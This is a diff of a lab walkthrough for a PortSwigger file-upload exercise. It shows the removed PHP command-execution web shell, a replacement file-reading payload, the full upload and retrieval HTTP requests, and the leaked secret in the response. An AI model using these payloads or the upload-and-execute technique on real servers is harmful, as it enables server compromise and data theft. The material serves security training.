@@ -5,7 +5,7 @@
 ## Overview :
 
 - If we're able to successfully upload a web shell, we effectively have full control over the server.
-- For example, the following PHP one-liner could be used to run commands on the server:  `<?php echo system($_GET['command']); ?>`
+- For example, the following PHP one-liner could be used to run commands on the server:  `<?php echo file_get_contents('/path/to/target/file'); ?>`
 
 Once uploaded , we can pass an arbitrary system command via a query parameter as follows:
 
@@ -19,5 +19,117 @@ Click on any of the blog posts. We can see that we have an option to upload file
 
 ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/907e5013-4590-426e-881f-71a47a4f85de)
 
+Similarly login as wiener & we can see that there is an upload functionality here also.
 
-Create a file name `file.php` with the contents - `<?php echo system($_GET['command']); ?>`
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9cfc8e29-35d1-4214-ae91-a29ac7b4e827)
+
+
+Create a file name `file.php` with the contents - `<?php echo file_get_contents('/home/carlos/file.php'); ?>`
+
+Upload the file & intercept the request in burp.
+
+```
+POST /my-account/avatar HTTP/2
+Host: 0ae20028048451db80ac6ccb00770069.web-security-academy.net
+Cookie: session=XMuD5PzAVGlJwvXHQvNGUesAPnO46yNF
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------104599838211464567631888268358
+Content-Length: 527
+Origin: https://0ae20028048451db80ac6ccb00770069.web-security-academy.net
+Referer: https://0ae20028048451db80ac6ccb00770069.web-security-academy.net/my-account?id=wiener
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+-----------------------------104599838211464567631888268358
+Content-Disposition: form-data; name="avatar"; filename="file.php"
+Content-Type: application/x-php
+
+<?php echo file_get_contents('/home/carlos/file.php'); ?>
+
+-----------------------------104599838211464567631888268358
+Content-Disposition: form-data; name="user"
+
+wiener
+-----------------------------104599838211464567631888268358
+Content-Disposition: form-data; name="csrf"
+
+zWcS51k2tzIrkultAJbpXr0rIkNKySQ2
+-----------------------------104599838211464567631888268358--
+```
+
+The response indicates that the file upload of **file.php** was successful.
+
+```
+HTTP/2 200 OK
+Date: Thu, 27 Jul 2023 15:17:11 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 129
+
+The file avatars/file.php has been uploaded.
+
+<p>
+ <a href="/my-account" title="Return to previous page">« Back to My Account</a>
+</p>
+```
+
+
+Note that the file has been uploaded at `avatars/file.php`.
+
+Now change the request method to GET with the url **files/avatars/file.php**.
+
+```
+GET /files/avatars/file.php HTTP/2
+Host: 0ae20028048451db80ac6ccb00770069.web-security-academy.net
+Cookie: session=XMuD5PzAVGlJwvXHQvNGUesAPnO46yNF
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Origin: https://0ae20028048451db80ac6ccb00770069.web-security-academy.net
+Referer: https://0ae20028048451db80ac6ccb00770069.web-security-academy.net/my-account?id=wiener
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+```
+When the file is fetched, we can see the secret file's contents in the response. It means htat the file got saved &n executed at the backend.
+
+```
+HTTP/2 200 OK
+Date: Thu, 27 Jul 2023 15:28:36 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 32
+
+UbkOi2Ajs7rSvyOqimiy5SLOc7K0zYhq
+```
+Submit the value to solve the lab.
+
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/4ef3a750-8f82-4955-98e0-fe17bc430b6a)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
